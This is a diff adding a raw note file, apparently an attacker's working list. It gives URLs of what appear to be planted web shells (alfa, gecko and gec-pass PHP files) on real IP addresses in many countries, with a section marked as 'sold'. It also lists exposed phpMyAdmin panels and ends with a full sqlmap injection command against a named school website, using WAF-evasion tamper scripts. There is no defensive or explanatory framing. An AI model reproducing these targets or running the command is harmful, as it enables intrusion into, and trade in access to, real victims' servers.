@@ -1,0 +1,90 @@
+phpmyadmin
+http://103.56.93.20:4147/phpmyadmin/index.php?route=/
+
+LIST
+http://203.160.59.115:7777/popup/view12.php
+
+
+loger
+http://103.56.93.20:4147/phpmyadmin/server_sql.php?get123
+
+
+proses menghilangkan backlink
+
+                  
+
+bahan ikan
+http://ssweb2.capellamultidana.com/admin/x2/avatar/view10.php
+
+
+dom press
+
+
+Fath
+inlislite3/uploaded_files/dokumen_isi/Skripsi//db_sql.php
+/inlislite3/uploaded_files/dokumen_isi/Monograf//db_sql.php
+inlislite3/api/db.php
+
+
+///start sold
+http://202.78.201.50:83/dispatch_api/test.php
+http://103.56.93.20:4147/img/gecko-login.php
+http://103.159.197.82:84/gecko-login.php
+http://203.160.59.115:7777/popup/view12.php
+
+http://143.44.162.23:82/only-one.php
+http://120.29.157.61:8080/only-one.php
+http://103.11.135.181:5000/phpmyadmin/vendor/phpmyadmin/only-one.php
+http://103.154.218.69:5555/apah1.php
+http://203.160.59.99:7777/popup/alfa-mini.php
+
+latte
+http://36.64.90.18:7777/popup/print_wom.php
+http://36.95.207.251:7777/popup/print_wom.php
+http://103.136.161.37:7777/popup/print_wom.php
+///end sold
+
+Thailand
+http://171.103.44.102:81/gec-pass.php
+http://150.107.221.118:8888/gec-pass.php
+________________________________________________
+#ru :
+http://46.243.14.12:4242/alfa-pass.php
+
+#us :
+http://18.144.141.211/gec-pass.php
+http://216.70.31.157:88/gec-pass.php
+http://52.15.52.224:8080/gec-pass.php
+________________________________________________
+#sp
+http://185.56.180.108:83/gec-pass.php
+
+#CO
+http://179.33.29.147:8025/gec-pass.php
+
+#ge 
+http://185.134.173.106:8099/gec-pass.php
+
+#sg
+http://47.129.54.180/sod-gec.php
+
+#bg
+http://151.237.40.119:8081/gec-pass.php
+
+#in
+http://59.94.34.169:8181/gec-pass.php
+
+#gr
+http://85.215.232.163/gec-pass.php
+
+#be
+http://81.246.8.145:88/gec-pass.php
+
+#pt
+http://193.137.172.20:81/gec-pass.php
+
+https://www.man1acehtimur.sch.id/editor/jscripts/tiny_mce/plugins/advcode/js/codepress/codepress.html?language=php&ts=1706659200010
+
+
+
+python3 sqlmap.py -u "https://www.man1acehtimur.sch.id/editor/jscripts/tiny_mce/plugins/advcode/js/codepress/codepress.html?language=php&ts=1706659200010" --data="editor/jscripts/tiny_mce/plugins/advcode/js/codepress/codepress.html?language=php&ts=1706659200010" --random-agent --keep-alive --threads=10 --level=5 --risk=3 --dbs --flush-session --tamper=space2comment,modsecurityzeroversioned --batch
